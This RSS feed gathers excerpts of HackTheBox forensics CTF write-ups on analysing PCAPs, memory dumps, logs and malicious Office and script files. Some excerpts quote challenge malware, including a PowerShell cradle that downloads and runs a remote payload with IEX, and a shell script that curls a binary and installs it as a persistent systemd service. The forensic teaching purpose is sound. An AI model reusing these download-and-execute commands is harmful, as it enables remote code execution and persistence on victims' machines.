<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Forensics on 7Rocky's Blog. Cybersecurity and Maths</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/</link><description>Recent content in Forensics on 7Rocky's Blog. Cybersecurity and Maths</description><generator>Hugo -- gohugo.io</generator><language>es</language><atom:link href="https://7rocky.github.io/en/ctf/htb-challenges/forensics/index.xml" rel="self" type="application/rss+xml"/><item><title>Alien Cradle</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/alien-cradle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/alien-cradle/</guid><description>We are given a PowerShell script called cradle.ps1:
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); PowerShell deobfuscation It is a bit obfuscated, let&amp;rsquo;s format it a bit:
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth') { exit }; $w = New-Object net.</description></item><item><title>Artifacts Of Dangerous Sighting</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/artifacts-of-dangerous-sighting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/artifacts-of-dangerous-sighting/</guid><description>We are given a Windows disk image inside a folder called HostEvidence_PANDORA:
$ file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 If we switch to a Windows machine and mount the disk image, we will have the following folders:
Analyzing the disk image Basically, it is the C:\ drive of a Windows machine.</description></item><item><title>Automation</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/automation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/automation/</guid><description>We are given a PCAP file with a lot of packets:
HTTP traffic If we filter by HTTP, we will see some requests and responses:
As can be seen, the victim is downloading an exe file. This time we won&amp;rsquo;t be analyzing the binary file. Notice that there is a suspicious request to /desktop.png. The response contains Base64-encoded data:
PowerShell analysis If we decode it, we will get a PowerShell script:</description></item><item><title>Chase</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/chase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/chase/</guid><description>We are given a PCAP file with some HTTP messages and TCP segments:
HTTP traffic If we filter by HTTP, we will see some requests and responses:
We might think that the cyber criminal found a remote file upload vulnerability and uploaded cmd.aspx and then uploaded nc64.exe to execute commands. Actually, we can see that the cyber criminal got a reverse shell on the Windows host:
At the end of the PCAP capture, we see that the cyber criminal tries to access a file named JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.</description></item><item><title>Deadly Arthropod</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/deadly-arthropod/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/deadly-arthropod/</guid><description>We are given a PCAP file called deadly_arthropod.pcap with some USB events:
Identifying the device There is an event that shows that the USB device is a keyboard (actually, Razer BlackWidow Ultimate 2013):
Therefore, we will need to analyze key strokes, like in Logger. Hardware devices use a protocol known as Human Interface Device (HID). More information can be found at Wikipedia. In fact, there is a documentation manual attached: ww.</description></item><item><title>Downgrade</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/downgrade/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/downgrade/</guid><description>We are given a lot of Windows Event logs (.evtx files):
$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.evtx ├── Microsoft-Windows-Forwarding%4Operational.</description></item><item><title>Event Horizon</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/event-horizon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/event-horizon/</guid><description>We have this challenge description:
Our CEO&amp;rsquo;s computer was compromised in a phishing attack. The attackers took care to clear the PowerShell logs, so we don&amp;rsquo;t know what they executed. Can you help us?
And we are given a lot of log files:
$ ls -l total 0 drwxrwxr-x 325 root root 10400 Nov 2 2020 Logs drwxrwxr-x 2 root root 64 Sep 15 2018 TraceFormat $ find . . .</description></item><item><title>Export</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/export/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/export/</guid><description>We are given a memory dump called WIN-LQS146OE2S1-20201027-142607.raw:
$ file WIN-LQS146OE2S1-20201027-142607.raw WIN-LQS146OE2S1-20201027-142607.raw: data Reading the name we can assume it comes from a Windows machine.
Memory dump analysis Let&amp;rsquo;s use volatility to analyze it (I will use a Docker image for that):
$ docker run --rm -v "${PWD}":/project --entrypoint /bin/bash -it phocean/volatility vol@6c13ee800d5a:/volatility$ cd /project vol@6c13ee800d5a:/project$ python /volatility/vol.py -f WIN-LQS146OE2S1-20201027-142607.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search.</description></item><item><title>Extraterrestrial Persistence</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/extraterrestrial-persistence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/extraterrestrial-persistence/</guid><description>We are given a shell script called persistence.sh:
n=`whoami` h=`hostname` path='/usr/local/bin/service' if [[ "$n" != "pandora" &amp;amp;&amp;amp; "$h" != "linux_HQ" ]]; then exit; fi curl https://files.pypi-install.com/packeges/service -o $path chmod +x $path echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode &amp;gt; /usr/lib/systemd/system/service.service systemctl enable service.service Shell script analysis It looks like it is checking some values of the machine, then downloading some payload with curl and executing a Base64-encoded string to save it as a service.</description></item><item><title>Fake News</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/fake-news/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/fake-news/</guid><description>We are given a folder named html with a lot files from a WordPress server:
$ ls index.php wp-activate.php wp-blogs wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php license.txt wp-admin wp-comments-post.php wp-config.php wp-includes wp-login.php wp-signup.php readme.html wp-blog-header.php wp-config-docker.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php Basic inspection Obviously, wp-blogs stands out, so let&amp;rsquo;s examine files that are inside:
$ ls wp-blogs 2022 $ ls wp-blogs/2022/ 11 $ ls wp-blogs/2022/11/ index.php style.css $ du -h wp-blogs/2022/11/* 304K wp-blogs/2022/11/index.</description></item><item><title>Free Services</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/free-services/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/free-services/</guid><description>We are given a Microsoft Office Excel file named free_decryption.xlsm. The m in the extension points out that the file has VBA macros inside.
VBA macros extraction Nevertheless, olevba from oletools is not able to extract the VBA code:
$ olevba free_decryption.xlsm olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools =============================================================================== FILE: free_decryption.xlsm Type: OpenXML No VBA or XLM macros found. So, we will need to open the file (and disable macros).</description></item><item><title>Halloween Invitation</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/halloween-invitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/halloween-invitation/</guid><description>We are given a ZIP archive that contains a file named invitation.docm:
$ unzip -l Halloween\ Invitation.zip Archive: Halloween Invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 14:04 invitation.docm --------- ------- 5252634 1 file $ unzip Halloween\ Invitation.zip Archive: Halloween Invitation.zip [Halloween Invitation.zip] invitation.docm password: inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+ VBA macros extraction This means that we have a Microsoft Word document with VBA macros.</description></item><item><title>Insider</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/insider/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/insider/</guid><description>We are given a folder called Mozilla with a lot of Firefox files:
$ find Mozilla -type f Mozilla/Firefox/installs.ini Mozilla/Firefox/profiles.ini Mozilla/Firefox/Profiles/yodxf5e0.default/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.baklz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/failed/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/toFetch/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/compatibility.ini Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/addons.json Mozilla/Firefox/Profiles/2542z9mo.default-release/logins.json Mozilla/Firefox/Profiles/2542z9mo.default-release/search.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionCheckpoints.json Mozilla/Firefox/Profiles/2542z9mo.default-release/pkcs11.txt Mozilla/Firefox/Profiles/2542z9mo.default-release/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/extension-preferences.json Mozilla/Firefox/Profiles/2542z9mo.default-release/addonStartup.json.lz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/crashes/store.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/key4.db Mozilla/Firefox/Profiles/2542z9mo.default-release/webappsstore.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/protections.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/security_state/data.safe.bin Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/aborted-session-ping Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/session-state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604498649754.5212ab6a-268f-4c2b-aa0b-cf46c3d1dc71.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604509449817.7d32a9b1-03f4-4155-8f99-ebd1cceb30d5.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604496849746.014e92ae-cb57-4c0e-a97c-66ffa45bfe20.new-profile.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604507415845.36b506e6-3dea-4646-8ae3-62e9fd1b4692.main.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/broadcast-listeners.json Mozilla/Firefox/Profiles/2542z9mo.default-release/cookies.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/containers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/formhistory.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/extensions.json Mozilla/Firefox/Profiles/2542z9mo.default-release/handlers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/bookmarkbackups/bookmarks-2020-11-04_11_Xwf6HUY0M1+1NgBa9qQfXA==.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/content-prefs.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.info Mozilla/Firefox/Profiles/2542z9mo.</description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/interstellar-c2/</guid><description>We are given a PCAP file called capture.pcapng. Let&amp;rsquo;s open it in Wireshark:
As always, it is nice to start analyzing top-level protocols like HTTP, so let&amp;rsquo;s apply a filter:
The first request is trying to download a PowerShell script called vn84.ps1:
PowerShell deobfuscation We can take the script from Wireshark and read it here:
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so') ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ; &amp;amp;("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3 ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte')); .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle') BI34 ( [TyPE]("</description></item><item><title>Logger</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/logger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/logger/</guid><description>We are given a PCAP file called keystrokes.pcapng with some USB events:
Identifying the device The second event shows that the USB device is a keyboard:
Therefore, we will need to analyze key strokes. Hardware devices use a protocol known as Human Interface Device (HID). More information can be found at Wikipedia. In fact, there is a documentation manual attached: www.usb.org, where some HID tables are found (Section 10: &amp;ldquo;Keyboard/Keypad Page (0x07)&amp;rdquo;):</description></item><item><title>Lure</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/lure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/lure/</guid><description>We are given a Microsoft Office Word file named UrgentPayment.doc:
$ file UrgentPayment.doc UrgentPayment.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: Ian Austin, Template: Normal.dotm, Last Saved By: egre55, Revision Number: 4, Name of Creating Application: Microsoft Office Word, Total Editing Time: 40:00, Create Time/Date: Tue Nov 3 18:07:00 2020, Last Saved Time/Date: Tue Nov 3 18:57:00 2020, Number of Pages: 1, Number of Words: 2, Number of Characters: 12, Security: 0 VBA macros extraction With olevba from oletools we are able to extract VBA macros code:</description></item><item><title>MarketDump</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/marketdump/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/marketdump/</guid><description>We are given a PCAP file with a lot of TCP segments:
Network traffic analysis We can open it in Wireshark and take a look at all the protocols captured in the file (&amp;ldquo;Statistics &amp;gt; Protocol Hierarchy&amp;rdquo;):
The most suspicious protocol that has been used is Telnet, which is a protocol that is employed to connect to another machine. However, it is not secure because everything travels in plaintext. Moreover, we can see that 46 packets were using Telnet.</description></item><item><title>No Place To Hide</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/no-place-to-hide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/no-place-to-hide/</guid><description>We are given these log files from a Windows RDP session:
$ file Cache0000.bin Cache0000.bin: data $ file bcache24.bmc bcache24.bmc: empty $ du -h Cache0000.bin bcache24.bmc 17M Cache0000.bin 0B bcache24.bmc And this is the description of the challenge:
We found evidence of a password spray attack against the Domain Controller, and identified a suspicious RDP session. We&amp;rsquo;ll provide you with our RDP logs and other files. Can you see what they were up to?</description></item><item><title>Packet Cyclone</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/packet-cyclone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/packet-cyclone/</guid><description>We have this description for the challenge:
Pandora&amp;rsquo;s friend and partner, Wade, is the one that leads the investigation into the relic&amp;rsquo;s location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade&amp;rsquo;s research to the cloud.</description></item><item><title>Peel Back The Layers</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/peel-back-the-layers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/peel-back-the-layers/</guid><description>We have this description for the challenge:
A well known hacker rival of ours, managed to gain access to our dockehub profile and insert a backdoor to one of our public docker images in order to distribute his malware and fullfil his soul purpose, which is to destroy our steampunk robot using his steam malware. When we started tracing him back he deleted his backdoor. Can you help us retrieve his backdoor?</description></item><item><title>POOF</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/poof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/poof/</guid><description>We are given some files:
$ unzip -l POOF.zip Archive: POOF.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7822474 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files And we have an endpoint to connect to and answer some questions:
$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween.</description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/relic-maps/</guid><description>We have this description for the challenge:
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag.</description></item><item><title>Wrong Spooky Season</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/wrong-spooky-season/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/wrong-spooky-season/</guid><description>We are given a network traffic capture file called capture.pcap.
Traffic analysis We can use Wireshark to analyze it:
HTTP messages There are a lot of packages. Let&amp;rsquo;s filter by HTTP first:
Alright, we have significanly less packages to analyze.
There are some HTTP messages that stand out at the end. We guess that a malicious user is executing remote system commands on the server (cmd=whoami, cmd=id &amp;hellip;). The last message is using socat to obtain a reverse shell connection, we can select this packet and remove the HTTP filter.</description></item></channel></rss>